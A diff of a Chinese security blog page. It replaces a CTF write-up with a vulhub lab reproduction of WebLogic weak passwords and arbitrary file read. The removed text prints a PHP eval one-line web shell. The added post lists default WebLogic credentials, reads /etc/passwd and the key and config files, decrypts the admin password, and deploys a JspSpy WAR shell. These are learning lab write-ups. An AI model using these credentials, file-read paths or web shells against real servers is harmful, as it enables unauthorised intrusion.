@@ -4,9 +4,14 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="i春秋wp, god_13">
-    <meta name="description" content="我会擦去因为太菜留下的泪水，还会装作一切都无所谓的样子！
-爆破1我是按照做题人数有多到少来做的，由简入繁嘛！这道题需要传入参数hello，post和get方式都可以。做了一个简单的正则匹配，意思是输入字母或数字。主要看的是var_dump(">
+    <meta name="keywords" content="weblogic weak_password复现, god_13">
+    <meta name="description" content="环境基于vulhub的weblogic弱口令漏洞和任意文件读取漏洞
+弱口令本环境存在弱口令
+用户名：weblogic
+密码：Oracle@123
+weblogic常见的弱口令组合
+1.  Oracle - WebLogic
+Method  ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>i春秋wp | god_13</title>
+    <title>weblogic weak_password复现 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -258,13 +263,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        i春秋wp
+                        weblogic weak_password复现
                     </div>
                 </div>
             </div>
@@ -375,8 +380,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/" target="_blank">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/漏洞复现/" target="_blank">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -390,21 +395,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2018-12-27
+                    2019-07-25
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        534
+                        810
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        3 Min
                     </div>
                     
                 
@@ -420,12 +425,86 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="我会擦去因为太菜留下的泪水，还会装作一切都无所谓的样子！"><a href="#我会擦去因为太菜留下的泪水，还会装作一切都无所谓的样子！" class="headerlink" title="我会擦去因为太菜留下的泪水，还会装作一切都无所谓的样子！"></a>我会擦去因为太菜留下的泪水，还会装作一切都无所谓的样子！</h1><a id="more"></a>
-<h2 id="爆破1"><a href="#爆破1" class="headerlink" title="爆破1"></a>爆破1</h2><p>我是按照做题人数有多到少来做的，由简入繁嘛！<br><img src="/2018/12/27/i-chun-qiu-wp/1.PNG" alt=""><br>这道题需要传入参数hello，post和get方式都可以。做了一个简单的正则匹配，意思是输入字母或数字。主要看的是var_dump()这个函数。<br><img src="/2018/12/27/i-chun-qiu-wp/2.PNG" alt=""><br>所以这里就要用到超全局变量GLOBALS了，使用get或post方式传入<br><img src="/2018/12/27/i-chun-qiu-wp/3.PNG" alt=""><br>GLOBALS可以显示出来所有的变量，在里面可以找到flag。</p>
-<h2 id="爆破2"><a href="#爆破2" class="headerlink" title="爆破2"></a>爆破2</h2><p>跟爆破1类似<br><img src="/2018/12/27/i-chun-qiu-wp/4.PNG" alt=""><br>题目提示flag不在变量中。同样的也是传入了参数hello，此处利用file_get_contents来读取flag.php这个文件。<br><img src="/2018/12/27/i-chun-qiu-wp/5.PNG" alt=""><br>这样就可以读取出flag.php中的flag了<br><img src="/2018/12/27/i-chun-qiu-wp/6.PNG" alt=""><br>在源代码中会多出一些字符串，就是flag.php里的内容（属于任意文件读取漏洞）<br><strong>file_get_contents()函数：</strong><br>file_get_contents() 函数把整个文件读入一个字符串中。<br>和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。</p>
-<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="/2018/12/27/i-chun-qiu-wp/7.PNG" alt=""><br>题目是长这样，有一个hint是：flag在flag.php里，本来以为就是在那个网页里，但是打开是这样子的<br><img src="/2018/12/27/i-chun-qiu-wp/8.PNG" alt=""><br>并没有什么有用的信息，后来试了试上传，发现连.php的后缀的都能直接上传成功，真是跟一般的不太一样啊，但是他下面有一个“上传成功！”，点开发现是自己刚才在.php后缀里上传的一句话，但是并不完全，韩很明显是过滤了一些东西：&lt;? 和 php<br><img src="/2018/12/27/i-chun-qiu-wp/9.PNG" alt=""><br>那么就想到是用菜刀连了，前提是我们要先避免让他把关键字给过滤掉，就需要用到其他形式的一句话木马了，如下</p>
-<pre><code>&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;sb&#39;])&lt;/script&gt;
-</code></pre><p>然后用菜刀连，url是<a href="http://8e91c1939a2e4a53a69167cf80f8f937099b04b568a246be.game.ichunqiu.com" target="_blank" rel="noopener">http://8e91c1939a2e4a53a69167cf80f8f937099b04b568a246be.game.ichunqiu.com</a><br>没有后面的具体路径，因为tips是flag在flag.php里，而且我们也不知道他的具体路径，连上之后<br><img src="/2018/12/27/i-chun-qiu-wp/10.PNG" alt=""><br>flag果然在里面。这道题靠的是不同形式的一句话的上传，从而解出来falg。</p>
+                <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>基于vulhub的weblogic弱口令漏洞和任意文件读取漏洞</p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>本环境存在弱口令</p>
+<pre><code>用户名：weblogic
+密码：Oracle@123
+</code></pre><p>weblogic常见的弱口令组合</p>
+<pre><code>1.  Oracle - WebLogic
+Method    HTTP
+User ID    system
+Password    password
+Level    Administrator
+Doc    
+Notes    Login located at /console
+
+2.  Oracle - WebLogic
+Method    HTTP
+User ID    weblogic
+Password    weblogic
+Level    Administrator
+Doc    
+Notes    Login located at /console
+
+3.  Oracle - WebLogic
+Version    9.0 Beta (Diablo)
+User ID    weblogic
+Password    weblogic
+Doc    
+
+4.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    admin
+Password    security
+Doc    
+
+5.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    joe
+Password    password
+Doc    
+
+6.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    mary
+Password    password
+Doc    
+
+7.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    system
+Password    security
+Doc    
+
+8.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    wlcsystem
+Password    wlcsystem
+Doc    
+
+9.  Oracle - WebLogic Process Integrator
+Version    2.0
+User ID    wlpisystem
+Password    wlpisystem
+Doc    
+</code></pre><p>获取到账号和密码之后，我们可以进入到后台去上传war的web应用程序和木马获得权限</p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>搭建好的环境有任意文件读取漏洞，具体路径是</p>
+<pre><code>http://192.168.75.131:7001/hello/file.jsp?path=/etc/passwd
+</code></pre><p>会读取到账号和密码<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/1.PNG" alt=""><br>但是还没有什么实质性的作用，要怎么利用这个漏洞呢？下面就是一些干货了。weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。<br>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，这就是密钥，右键copy to file就可以保存成一个文件：</p>
+<pre><code>http://192.168.75.131:7001/hello/file.jsp?path=security/SerializedSystemIni.dat
+</code></pre><p><img src="/2019/07/25/weblogic-weak-password-fu-xian/2.PNG" alt=""><br>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，不要找错了：</node-manager-password-encrypted></p>
+<pre><code>http://192.168.75.131:7001/hello/file.jsp?path=config/config.xml
+</code></pre><p><img src="/2019/07/25/weblogic-weak-password-fu-xian/3.PNG" alt=""></p>
+<h3 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h3><p>我们有了密钥和密码，下面就要解密了，然后使用工具weblogic_decrypt.jar解密<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/4.PNG" alt=""><br>同样获取到了明文密码，就算没有弱口令也是可以进入后台上传shell的</p>
+<h2 id="后台上传shell"><a href="#后台上传shell" class="headerlink" title="后台上传shell"></a>后台上传shell</h2><h3 id="war简介"><a href="#war简介" class="headerlink" title="war简介"></a>war简介</h3><p>war是一个可以直接运行的web模块，通常用于网站，打成包部署到容器中。war包放置到web目录下之后，可以自动解压，就相当于发布了。<br>简单来说，war包是JavaWeb程序打的包，war包里面包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。</p>
+<h3 id="war打包"><a href="#war打包" class="headerlink" title="war打包"></a>war打包</h3><p>linux下把文件打包成war的压缩包，命令如下</p>
+<pre><code>jar -cvf blog.war *
+</code></pre><p>查看example.war</p>
+<pre><code>jar -tf blog.war
+</code></pre><p>也可以先把文件压缩成zip，再改后缀名为war</p>
+<h3 id="部署war文件"><a href="#部署war文件" class="headerlink" title="部署war文件"></a>部署war文件</h3><p>上传war的流程如下图所示<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/1.gif" alt=""><br>总结起来就是：域结构-部署-安装-上传文件-将此部署安装为应用程序。然后访问项目名称即可。<br>最后访问的路径是</p>
+<pre><code>http://192.168.75.131:7001/JspSpy/JspSpy.jsp
+</code></pre><p>截图如下<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/5.PNG" alt=""><br>至此就拿到了shell</p>
 
             </div>
             <hr>
@@ -581,9 +660,9 @@
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《i春秋wp》
+                    《weblogic weak_password复现》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2018/12/27/i-chun-qiu-wp/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/25/weblogic-weak-password-fu-xian/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -646,27 +725,34 @@
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2018/12/27/zheng-ze-biao-da-shi/">
+                <a href="/2019/07/25/weblogic-weak-password-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="正则表达式">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="weblogic weak_password复现">
                         
-                        <span class="card-title">正则表达式</span>
+                        <span class="card-title">weblogic weak_password复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            环境基于vulhub的weblogic弱口令漏洞和任意文件读取漏洞
+弱口令本环境存在弱口令
+用户名：weblogic
+密码：Oracle@123
+weblogic常见的弱口令组合
+1.  Oracle - WebLogic
+Method  
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -674,6 +760,15 @@
                             
                         </span>
                     </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -685,30 +780,24 @@
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/12/17/ke-cheng-she-ji-zong-jie/">
+                <a href="/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="课程设计总结">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="weblogic ssrf 漏洞复现">
                         
-                        <span class="card-title">课程设计总结</span>
+                        <span class="card-title">weblogic ssrf 漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            单链表的创建
-前插法：（1）创建只有一个头结点的空链表（2）根据创建链表包括的元素个数n，循环n次执行以下操作
-
-生成一个新结点p输入元素值赋给新结点p的数据域将新结点插入到头结点之后
-
-【算法描述】
-void CreateList_H(L
+                            ssrf简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-17
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-24
                             </span>
                         <span class="publish-author">
                             
@@ -721,8 +810,8 @@ void CreateList_H(L
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/杂记/" target="_blank">
-                        <span class="chip bg-color">杂记</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
